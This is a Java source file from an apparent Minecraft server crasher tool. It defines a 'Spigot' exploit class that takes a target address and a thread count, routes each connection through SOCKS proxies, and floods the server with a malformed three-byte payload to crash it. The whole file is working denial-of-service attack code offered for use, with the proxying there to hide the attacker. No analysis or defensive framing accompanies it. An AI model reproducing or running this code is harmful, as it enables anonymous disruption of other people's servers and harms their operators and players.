package uwu.narumi.crasher.core.exploit;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.concurrent.Executors;
import java.util.function.Supplier;
import uwu.narumi.crasher.api.exception.ExploitException;
import uwu.narumi.crasher.api.exploit.Exploit;
import uwu.narumi.crasher.api.exploit.ExploitInfo;
import uwu.narumi.crasher.api.exploit.argument.Argument;
import uwu.narumi.crasher.api.helper.AddressHelper.McAddress;
import uwu.narumi.crasher.api.helper.ProxyHelper;


@ExploitInfo(
    name = "Spigot",
    description = "Simple spigot crasher",
    usage = "exploit spigot <address> <amount>"
)
public class Spigot extends Exploit<byte[]> {

  public Spigot() {
    super(()-> new byte[]{0, 0, 0},
        new Argument("address", 0, McAddress.class),
        new Argument("amount", 1, Integer.class)
    );
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    McAddress address = (McAddress) args[0];
    int amount = (int) args[1];

    index.set(0);
    executor = Executors.newFixedThreadPool(amount);
    for (int i = 0; i < amount; i++) {
      executor.execute(()-> {
        try {
          Proxy proxy = ProxyHelper.getSocks();
          try (Socket socket = ProxyHelper.createSocket(proxy)) {
            if (socket == null)
              throw new ThreadDeath();

            socket.connect(new InetSocketAddress(address.getIp(), address.getPort()));
            socket.getOutputStream().write(exploitSource().get());
            System.out.println(String.format(" %s -> %s | %s/%s", proxy, address.toString(), index.getAndIncrement(), amount));
          }
        }catch (Exception ignored) {}
      });
    }
  }
}
